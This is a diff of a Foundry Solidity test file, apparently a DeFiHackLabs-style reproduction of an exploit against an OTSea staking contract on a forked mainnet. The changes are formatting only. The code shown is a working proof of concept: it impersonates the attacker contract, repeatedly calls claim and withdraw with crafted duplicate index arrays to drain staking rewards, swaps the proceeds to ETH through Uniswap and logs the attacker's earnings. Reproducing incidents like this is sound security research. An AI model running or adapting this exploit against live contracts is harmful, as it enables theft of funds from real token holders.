@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-
 import "forge-std/Test.sol";
 import "../interface.sol";
 
@@ -34,16 +33,16 @@ interface IUniswapV2Router01 {
 
 interface IUniswapV2Router02 is IUniswapV2Router01 {
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
 }
 
 contract ContractTest is Test {
-    uint256 internal blocknumToForkFrom = 20738191 - 1;
+    uint256 internal blocknumToForkFrom = 20_738_191 - 1;
     address internal otseaDist = 0x34BCcF4aF03870265Fe99cEc262524F343Cca7ff;
     address internal attackContract = 0x5AeC8469414332d62Bf5058fb91F2f8457e5C5CB;
     address internal otseaToken = 0x5dA151B95657e788076D04d56234Bd93e409CB09;
@@ -67,7 +66,7 @@ contract ContractTest is Test {
             for (uint256 j = 0; j < 20; j++) {
                 indexes[j] = j;
             }
-            indexes[20] = 20+i;
+            indexes[20] = 20 + i;
 
             OTSeaStaking(otseaStaking).claim(indexes, attackContract);
             OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
@@ -77,7 +76,7 @@ contract ContractTest is Test {
             for (uint256 j = 0; j < 1; j++) {
                 indexes[j] = j;
             }
-            indexes[1] = 34+i;
+            indexes[1] = 34 + i;
 
             OTSeaStaking(otseaStaking).claim(indexes, attackContract);
             OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
@@ -85,20 +84,22 @@ contract ContractTest is Test {
         for (uint256 i = 0; i < 22; i++) {
             uint256[] memory indexes = new uint256[](25);
             for (uint256 j = 0; j < 23; j++) {
-                indexes[j] = j+20;
+                indexes[j] = j + 20;
             }
             indexes[23] = 70;
-            indexes[24] = 43+i;
+            indexes[24] = 43 + i;
 
             OTSeaStaking(otseaStaking).claim(indexes, attackContract);
             OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
         }
         address weth = IUniswapV2Router02(uniswapRouter).WETH();
-        IERC20(otseaToken).approve(uniswapRouter, 6000000000000000000000000);
+        IERC20(otseaToken).approve(uniswapRouter, 6_000_000_000_000_000_000_000_000);
         address[] memory paths = new address[](2);
         paths[0] = otseaToken;
         paths[1] = weth;
-        IUniswapV2Router02(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(6000000000000000000000000, 0, paths, attackContract, 1726188611);
+        IUniswapV2Router02(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
+            6_000_000_000_000_000_000_000_000, 0, paths, attackContract, 1_726_188_611
+        );
         vm.stopPrank();
         uint256 balance = IERC20(otseaToken).balanceOf(attackContract);
         console.log("Attacker earned:", balance);
